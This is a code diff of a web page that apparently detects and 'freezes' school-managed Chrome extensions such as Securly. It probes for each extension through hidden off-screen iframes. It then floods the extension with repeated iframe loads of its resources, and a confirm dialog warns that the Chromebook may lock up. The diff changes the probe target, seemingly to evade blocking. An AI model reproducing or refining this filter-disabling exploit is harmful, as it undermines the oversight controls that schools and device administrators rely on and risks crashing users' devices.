@@ -65,7 +65,7 @@
     <script>
       let from_id = (id) => document.getElementById(id);
 
-      // Extension info with IDs only (keep your original names and IDs)
+      // Keep your extension info with IDs and names
       let extensions = {
         securly_new: {
           name: "Securly",
@@ -165,17 +165,37 @@
         },
       };
 
-      // Check extension by fetching manifest.json (less likely to be blocked or moved)
+      // Detect extension by trying to load icon-128.png in hidden iframe
+      function checkExtensionIframe(id) {
+        return new Promise((resolve) => {
+          let iframe = document.createElement("iframe");
+          iframe.style.width = "1px";
+          iframe.style.height = "1px";
+          iframe.style.position = "absolute";
+          iframe.style.left = "-9999px";
+          iframe.src = `chrome-extension://${id}/icon-128.png?cachebust=${Date.now()}`;
+          document.body.appendChild(iframe);
+
+          iframe.onload = () => {
+            document.body.removeChild(iframe);
+            resolve(true);
+          };
+          iframe.onerror = () => {
+            document.body.removeChild(iframe);
+            resolve(false);
+          };
+
+          setTimeout(() => {
+            if (document.body.contains(iframe)) {
+              document.body.removeChild(iframe);
+              resolve(false);
+            }
+          }, 1500);
+        });
+      }
+
       async function checkExtension(id) {
-        try {
-          await fetch(`chrome-extension://${id}/manifest.json`, {
-            method: "GET",
-            mode: "no-cors",
-          });
-          return true;
-        } catch {
-          return false;
-        }
+        return await checkExtensionIframe(id);
       }
 
       async function detect_extensions() {
@@ -218,7 +238,6 @@
         }
       }
 
-      // Freeze extension by loading manifest.json in multiple iframes spaced out with delay
       function button_handler(extension) {
         let cancel = !confirm(
           "After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up! The Chromebook might freeze permanently if this happens — HIT the refresh+Power."
@@ -242,7 +261,7 @@
           }
 
           let iframe = document.createElement("iframe");
-          iframe.src = `chrome-extension://${id}/manifest.json?cachebust=${Date.now()}_${count}`;
+          iframe.src = `chrome-extension://${id}/icon-128.png?cachebust=${Date.now()}_${count}`;
           iframe.style.width = "1px";
           iframe.style.height = "1px";
           iframe.style.border = "none";
